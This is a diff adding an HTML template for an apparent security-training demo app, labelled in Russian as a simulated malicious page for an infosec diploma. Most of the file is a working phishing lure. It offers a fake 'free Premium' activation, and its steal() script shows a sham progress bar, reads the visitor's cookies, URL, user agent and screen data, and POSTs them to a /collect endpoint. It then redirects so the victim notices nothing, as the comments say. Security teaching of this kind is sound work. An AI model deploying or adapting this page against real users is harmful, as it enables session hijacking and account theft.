@@ -1,0 +1,125 @@
+{% extends "base.html" %}
+{% block title %}Free Premium Tool — SessionLab{% endblock %}
+{% block content %}
+<style>
+/* страница выглядит как легитимный сайт — жертва не подозревает */
+.fake-page {
+  max-width: 600px; margin: 4rem auto; text-align: center;
+}
+.fake-logo {
+  font-family: var(--mono); font-size: 2rem; font-weight: 700;
+  color: #e8f0f8; margin-bottom: 0.5rem;
+}
+.fake-sub { font-size: 14px; color: var(--text2); margin-bottom: 3rem; }
+.fake-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 2.5rem; margin-bottom: 1.5rem;
+}
+.fake-icon { font-size: 3rem; margin-bottom: 1rem; }
+.fake-title {
+  font-family: var(--mono); font-size: 1.1rem; font-weight: 700;
+  color: #e8f0f8; margin-bottom: 0.8rem;
+}
+.fake-desc { font-size: 13px; color: var(--text2); line-height: 1.7; margin-bottom: 1.5rem; }
+.fake-btn {
+  background: var(--accent); color: var(--bg);
+  font-family: var(--mono); font-size: 13px; font-weight: 700;
+  padding: 0.8rem 2rem; border: none; border-radius: 4px;
+  cursor: pointer; letter-spacing: 0.05em; width: 100%;
+}
+.fake-btn:hover { opacity: 0.9; }
+.loading {
+  display: none; margin-top: 1.5rem;
+  font-family: var(--mono); font-size: 12px; color: var(--text3);
+}
+.progress-bar {
+  height: 3px; background: var(--border); border-radius: 2px;
+  margin-top: 0.5rem; overflow: hidden;
+}
+.progress-fill {
+  height: 100%; width: 0%; background: var(--accent);
+  border-radius: 2px; transition: width 0.1s linear;
+}
+/* предупреждение для диплома */
+.edu-warning {
+  background: rgba(255,204,0,0.06); border: 1px solid rgba(255,204,0,0.2);
+  border-radius: 4px; padding: 1rem 1.2rem; margin-bottom: 2rem;
+  font-family: var(--mono); font-size: 11px; color: var(--yellow);
+  text-align: left; line-height: 1.6;
+}
+</style>
+
+<div class="fake-page">
+  <div class="edu-warning">
+    ⚠ УЧЕБНАЯ ДЕМОНСТРАЦИЯ — симуляция вредоносной страницы для диплома по ИБ.<br>
+    Реальная XSS атака работает аналогично но скрыто от жертвы.
+  </div>
+
+  <div class="fake-logo">🎁 FreePremium</div>
+  <div class="fake-sub">Получи премиум доступ бесплатно</div>
+
+  <div class="fake-card">
+    <div class="fake-icon">⚡</div>
+    <div class="fake-title">Активация Premium аккаунта</div>
+    <div class="fake-desc">
+      Нажми кнопку ниже чтобы активировать премиум доступ на 30 дней бесплатно.
+      Требуется подтверждение браузера.
+    </div>
+    <button class="fake-btn" onclick="steal()">
+      Активировать бесплатно →
+    </button>
+    <div class="loading" id="loading">
+      <div id="status">Проверка браузера...</div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progress"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+async function steal() {
+  // показываем фейковый прогресс
+  document.getElementById('loading').style.display = 'block';
+  const progress = document.getElementById('progress');
+  const status = document.getElementById('status');
+  const steps = [
+    [10, 'Проверка браузера...'],
+    [30, 'Подтверждение аккаунта...'],
+    [60, 'Активация лицензии...'],
+    [90, 'Финализация...'],
+  ];
+  for (const [pct, msg] of steps) {
+    progress.style.width = pct + '%';
+    status.textContent = msg;
+    await new Promise(r => setTimeout(r, 600));
+  }
+
+  // читаем все cookies
+  const cookies = document.cookie;
+
+  // отправляем на /collect
+  try {
+    await fetch('/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cookies:    cookies,
+        url:        window.location.href,
+        useragent:  navigator.userAgent,
+        timestamp:  new Date().toISOString(),
+        screen:     screen.width + 'x' + screen.height,
+        language:   navigator.language,
+      })
+    });
+  } catch(e) {}
+
+  progress.style.width = '100%';
+  status.textContent = 'Готово! Перенаправление...';
+  await new Promise(r => setTimeout(r, 800));
+
+  // редиректим на легитимную страницу — жертва ничего не замечает
+  window.location.href = '/';
+}
+</script>
+{% endblock %}
